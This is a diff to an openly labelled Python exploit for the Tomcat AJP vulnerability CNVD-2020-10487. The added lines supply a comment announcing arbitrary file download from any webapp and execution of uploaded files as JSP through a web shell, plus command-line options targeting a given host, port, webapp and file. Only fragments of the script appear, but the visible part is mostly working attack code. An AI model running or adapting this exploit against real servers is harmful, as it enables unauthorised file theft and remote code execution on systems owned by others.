@@ -1,6 +1,14 @@
 #!/usr/bin/env python
+#!encoding:utf-8
 #CNVD-2020-10487  Tomcat-Ajp lfi
 #by ydhcui
+
+'''
+添加:
+	1. 提供任意webapp下文件下载功能；
+	2. 添加执行以jsp形式执行任意文件功能。
+add by yujun 2020-02-25
+'''
 import struct
 
 # Some references:
@@ -291,9 +299,15 @@ parser = argparse.ArgumentParser()
 parser.add_argument("target", type=str, help="Hostname or IP to attack")
 parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")
 parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")
+parser.add_argument('-w', '--webapp', type=str, default='', help='webapp,attacked webapp: (examples)')
+parser.add_argument('-c', '--cmd', action="store_true", help='parse the -f/--file argument as jsp file, this need jsp web shell file(any file extension) that already uploaded to the server')
 args = parser.parse_args()
 t = Tomcat(args.target, args.port)
-_,data = t.perform_request('/asdf',attributes=[
+if not args.cmd:
+	targetWebapp = '/%s/asd@f34#' % args.webapp
+else:
+	targetWebapp = '/%s' % args.webapp
+_,data = t.perform_request(targetWebapp, attributes=[
     {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
     {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
     {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
